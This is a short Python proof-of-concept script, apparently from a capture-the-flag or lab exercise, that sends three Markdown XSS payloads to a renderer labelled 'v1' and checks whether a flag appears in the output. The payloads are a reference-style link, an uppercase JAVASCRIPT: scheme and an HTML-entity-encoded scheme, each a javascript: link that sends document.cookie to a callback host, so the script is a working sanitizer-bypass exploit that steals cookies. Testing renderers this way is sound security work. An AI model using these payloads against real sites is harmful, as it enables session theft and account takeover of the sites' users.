import sys
sys.path.insert(0, '.')
from poc_common import run_payload, CB

FLAG = "PCBFLAG_82160422a14c"

ref = "[CLICKME][r]\n\n[r]: " + "javascript:document.location='" + CB + "'+document.cookie"
up  = "[CLICKME](" + "JAVASCRIPT:document.location='" + CB + "'+document.cookie)"
ent = "[CLICKME](&#106;avascript:document.location='" + CB + "'+document.cookie)"

for name, payload in [("REF-STYLE", ref), ("UPPER-SCHEME", up), ("ENTITY-SCHEME(expect block)", ent)]:
    print("=== %s on v1 ===" % name)
    r = run_payload(payload, "v1")
    print(r)
    print("flag present:", FLAG in r)
